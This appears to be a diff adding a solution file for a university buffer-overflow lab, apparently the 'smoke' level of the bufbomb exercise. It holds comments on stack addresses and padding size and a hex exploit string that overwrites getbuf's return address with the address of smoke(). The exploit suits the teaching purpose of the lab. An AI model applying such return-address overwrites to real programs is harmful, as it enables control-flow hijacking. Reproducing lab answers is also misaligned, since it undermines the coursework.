@@ -1,0 +1,7 @@
+/* getbuf return at address: 0x55683754 */
+/* Local buffer starts at address: 0x55683728 */
+/* Padding required: 44 Bytes(exclude 4 Bytes return address) */
+
+00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+/* smoke() is located at address: 0x08048c90 */
+90 8c 04 08
